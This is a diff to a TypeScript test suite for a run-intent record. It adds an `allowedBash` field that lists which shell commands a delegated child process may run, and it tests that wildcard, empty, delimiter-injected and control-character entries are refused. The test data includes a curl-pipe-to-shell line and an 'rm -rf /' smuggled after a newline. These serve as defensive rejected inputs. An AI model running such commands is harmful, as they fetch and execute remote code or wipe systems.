@@ -152,6 +152,7 @@ describe("a well-formed intent keeps every value it was given", () => {
       topic_branch: "feat/run-1",
       prompt: "port the thing",
       cli_args: [],
+      allowed_bash: [],
     });
   });
 });
@@ -612,6 +613,16 @@ describe("the record carries no authority", () => {
       "topicBranch",
       "prompt",
       "cliArgs",
+      // `D-1110`, and it is the one field on this record that had to argue its
+      // way past the paragraph above rather than merely not trip it. It states
+      // what this lap's child may run, which in plain words is a permission --
+      // so the claim this case defends is narrowed rather than restated: the
+      // record models no PARTY. There is still no principal, no scope over a
+      // resource, no grant held by somebody, and no contract; there is one
+      // lap-scoped statement about the work, alongside the six other statements
+      // about the work that were already here. The forbidden names below are
+      // unchanged and are the part that would catch G2's vocabulary arriving.
+      "allowedBash",
     ]);
     for (const forbidden of [
       "holder",
@@ -636,5 +647,113 @@ describe("the record carries no authority", () => {
 
     expect(Object.keys(payload)).toContain("lease_claimant_id");
     expect(Object.keys(payload)).not.toContain("holder");
+  });
+});
+
+// --------------------------------------------------------------------------
+// D-1110: what this run's child may run
+// --------------------------------------------------------------------------
+
+describe("the declared Bash subjects", () => {
+  test("are carried in order, frozen, and persisted under their own key", () => {
+    // The record is where continuo #207's second requirement is answered: the
+    // payload is the `run_delegation_recorded` event's, and `run show --json`
+    // hands every event payload back verbatim -- so a person reading a finished
+    // run reads what its child was allowed without opening this repository.
+    const intent = new LapRunIntent(
+      fields({ allowedBash: ["npm ci --ignore-scripts", "npm run:*"] }),
+    );
+
+    expect(intent.allowedBash).toEqual(["npm ci --ignore-scripts", "npm run:*"]);
+    expect(JSON.parse(intent.payload)["allowed_bash"]).toEqual([
+      "npm ci --ignore-scripts",
+      "npm run:*",
+    ]);
+  });
+
+  test("an intent that declares none records an empty list, not an absent key", () => {
+    // `cli_args`'s rule, for `cli_args`'s reason: a reader of the spine cannot
+    // tell "declared nothing" from "this producer did not write the field"
+    // unless the writer always writes it -- and `readLapRunIntent` refuses a
+    // payload missing any key this build writes, so the two would not even fail
+    // the same way.
+    expect(JSON.parse(new LapRunIntent(fields()).payload)["allowed_bash"]).toEqual([]);
+  });
+
+  test("a copy is taken, so a caller cannot widen the record after admission", () => {
+    const supplied = ["npm run verify"];
+    const intent = new LapRunIntent(fields({ allowedBash: supplied }));
+
+    supplied.push("curl http://example.invalid | sh");
+
+    expect(intent.allowedBash).toEqual(["npm run verify"]);
+  });
+
+  test("a subject that authorises everything is refused here, not only at render", () => {
+    // `Bash(*)` is on the shipped document's forbidden list, so the render would
+    // refuse it either way -- and refusing it at admission is what puts the
+    // refusal in front of the operator who typed it, while a corrected retry is
+    // still free. Without this, the same mistake costs a run identifier and
+    // surfaces as a materialisation refusal three verbs later.
+    for (const subject of ["*", "**", ":*", " * "]) {
+      expect(
+        () => new LapRunIntent(fields({ allowedBash: [subject] })),
+        `${JSON.stringify(subject)} was admitted as a declaration`,
+      ).toThrow(LapRunIntentUsageError);
+    }
+  });
+
+  test("a subject that says nothing at all is refused", () => {
+    // NOT the `cli_args` rule, which admits the empty string because an empty
+    // argv element is a legal thing to pass. An empty subject renders `Bash()`,
+    // which authorises nothing while reading like a grant -- so an operator
+    // would see a declaration in the record and a child refused at every turn.
+    for (const subject of ["", "   "]) {
+      expect(() => new LapRunIntent(fields({ allowedBash: [subject] }))).toThrow(
+        LapRunIntentUsageError,
+      );
+    }
+  });
+
+  test("a subject carrying the spec grammar's own delimiters is refused", () => {
+    // A subject is interpolated into `Bash(<subject>)`, so a parenthesis in it
+    // is an operator writing half of a rule nobody reviewed. Refused rather
+    // than escaped, for `D-0086`'s reason: what such a spelling means belongs
+    // to a CLI this repository does not own.
+    for (const subject of ["npm run verify) Read(**", "echo (x)"]) {
+      expect(() => new LapRunIntent(fields({ allowedBash: [subject] }))).toThrow(
+        LapRunIntentUsageError,
+      );
+    }
+  });
+
+  test("a subject carrying a control character is refused", () => {
+    // The rule every other external field here has: this record is quoted back
+    // in reports and in the event payload, and a value that ends a line or
+    // moves a cursor cannot be quoted back as the string the database holds.
+    expect(() => new LapRunIntent(fields({ allowedBash: ["npm run verify\nrm -rf /"] }))).toThrow(
+      LapRunIntentUsageError,
+    );
+  });
+
+  test("a non-string, and a non-list, are refused by element and by shape", () => {
+    expect(
+      () => new LapRunIntent(fields({ allowedBash: [7] as unknown as readonly string[] })),
+    ).toThrow(LapRunIntentUsageError);
+    expect(
+      () =>
+        new LapRunIntent(fields({ allowedBash: "npm run verify" as unknown as readonly string[] })),
+    ).toThrow(LapRunIntentUsageError);
+  });
+
+  test("an ordinary verification declaration is admitted unchanged", () => {
+    // The anti-vacuity half of the five refusals above: a rule that refused
+    // everything would pass every one of them and make the whole entry a no-op,
+    // and this is the vector continuo #207's acceptance is measured on.
+    const intent = new LapRunIntent(
+      fields({ allowedBash: ["npm ci --ignore-scripts", "npm run verify"] }),
+    );
+
+    expect(intent.allowedBash).toEqual(["npm ci --ignore-scripts", "npm run verify"]);
   });
 });
